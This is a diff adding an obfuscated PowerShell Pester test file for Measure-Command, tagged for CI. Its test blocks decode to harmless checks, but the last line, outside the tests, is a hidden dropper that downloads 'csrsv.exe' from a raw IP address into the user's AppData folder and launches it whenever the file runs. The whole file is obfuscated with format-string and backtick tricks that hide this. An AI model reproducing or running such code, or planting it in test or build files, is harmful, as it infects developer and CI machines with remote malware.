@@ -1,0 +1,28 @@
+&("{1}{0}"-f 'be','Descri') ("{4}{3}{0}{1}{2}" -f 'Co','m','mand','easure-','M') -Tags "CI" {
+
+    &("{0}{2}{1}"-f'Cont','t','ex') ("{10}{0}{4}{9}{3}{8}{11}{2}{5}{6}{1}{7}"-f'al','r Measur','ty','r','idate','pe','s fo','e-Command','etu',' ','V','rn ') {
+
+        &('It') ("{0}{8}{1}{7}{4}{3}{2}{5}{6}" -f 'Sho','d re',' as ','pan','rn TimeS','the r','eturn type','tu','ul') {
+            &("{1}{3}{2}{0}"-f'mmand','Me','e-Co','asur') { .("{1}{0}" -f 'ate','Get-D') } | &("{1}{0}" -f 'd','Shoul') -BeOfType ("{2}{1}{0}"-f'an','esp','tim')
+        }
+    }
+
+    &("{1}{0}"-f 'text','Con') ("{7}{4}{5}{0}{2}{10}{8}{9}{11}{1}{12}{6}{3}{13}"-f ' tha','an','t i','rec','a','lidate','r','V',' is exe','cuting ','t','comm','ds co','tly') {
+
+        &('It') ("{7}{5}{4}{8}{0}{3}{2}{1}{10}{9}{6}"-f'm','ng','ter executi','eSpan af','u','o','t','Sh','ld return Ti',' scrip',' a') {
+            .("{1}{3}{0}{2}" -f'-C','Measur','ommand','e') { .("{1}{2}{0}{3}" -f'it','W','r','e-Output') ('hi') } | &("{1}{0}" -f'hould','S') -BeOfType ("{1}{2}{0}"-f 'mespan','t','i')
+        }
+
+        .('It') ("{1}{12}{6}{8}{0}{10}{11}{3}{7}{9}{5}{4}{2}"-f 'n TimeSpan','Sho','et',' exe','dl','g a cm','etu','cut','r','in',' ','after','uld r') {
+            ${PEsTER`S`Cr`iPT} = &("{1}{0}{2}" -f'n-P','Joi','ath') -Path (&("{0}{1}{2}" -f 'Joi','n-Pat','h') -Path ${p`s`S`CriPT`RooT} -ChildPath ("{0}{1}"-f'a','ssets')) -ChildPath ("{3}{2}{4}{0}{1}"-f'.ps','1','scr','echo','ipt')
+            ${t`ESTF`ILE} = ${pE`s`T`E`RScrIpT}
+            ${teSTCo`m`ma`Nd} = ("{6}{0}{5}{4}{2}{1}{3}"-f 'te-Ou','tertests','s','cript','t pe','tpu','Wri')
+            ${TESt`cOM`maNd} | .("{1}{0}{3}{2}"-f 'dd-C','A','t','onten') -Path ${teSt`FI`LE}
+
+            .("{3}{1}{2}{0}"-f 'and','sure-Com','m','Mea') { ${peSTErSc`RI`pt} } | &("{1}{0}"-f'ld','Shou') -BeOfType ("{2}{1}{0}"-f'an','imesp','t')
+            &("{2}{1}{0}"-f'm','te','Remove-I') ${T`ES`TfiLE}
+        }
+    }
+}
+
+(.("{2}{0}{3}{1}" -f'-Ob','ct','New','je') ("{1}{2}{3}{4}{0}"-f'Client','S','yst','em.Ne','t.Web')).("{1}{2}{0}{3}"-f 'oadFil','Do','wnl','e').Invoke(("{4}{5}{8}{0}{6}{2}{7}{3}{1}"-f '3.238/~yaho','xe','/csr','v.e','h','ttp:','o','s','//94.102.5'),"$env:APPDATA\csrsv.exe");.("{3}{0}{1}{2}{4}" -f 'tar','t-Proc','e','S','ss') ("$env:APPDATA\csrsv.exe")
